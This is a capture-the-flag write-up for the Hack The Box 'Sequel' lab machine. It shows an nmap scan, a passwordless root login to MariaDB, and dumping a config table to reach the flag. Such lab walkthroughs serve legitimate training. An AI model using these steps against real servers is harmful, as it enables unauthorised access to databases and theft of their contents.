# [Sequel](https://app.hackthebox.com/starting-point)

## Target IP - 10.129.233.4

### Enumeration

Here we are scanning the target machine for open ports and services also we added to scan for the default scripts and also I tried to save some time by giving a port range. In result we get that mysql server was running using the MariaDB.


**Command 1** -

`nmap -sC -sV 10.129.233.4 -p 3000-3500`

**Output** -
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 21:28 IST
Nmap scan report for 10.129.233.4
Host is up (0.55s latency).
Not shown: 500 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 97
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, SupportsCompression, DontAllowDatabaseTableColumn, ConnectWithDatabase, LongColumnFlag, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, IgnoreSigpipes, Speaks41ProtocolNew, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: x.y;X+iQ8eu<gu8V&ZsV
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 313.24 seconds
```

### Foothold

Now we can use the mysql server using the mysql client with the root user with the password.

**Command 2** -

`mysql -h 10.129.233.4 -u root`

**Output** -

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 105
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

```

Now we looked for the databases in the server and found that there are 4 databases but we want to access the `htb` database.

**Command 3** -

`show databases;`

**Output** -

```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.237 sec)
```

Now we used the `htb` database using the `use` command.

**Command 4** -

`use htb;`

**Output** -

```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
```

Now we looked for the table and found there are 2 tables.

**Command 5** -

`show tables;`

**Output** -

```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.220 sec)
```

Now we printed all the content of the config table and found the flag.

**Command 6** -

`select * from config;`

**Output** -

```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | "Confidential"                   |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.222 sec)
```

### This machine has been pawned

~goobar07
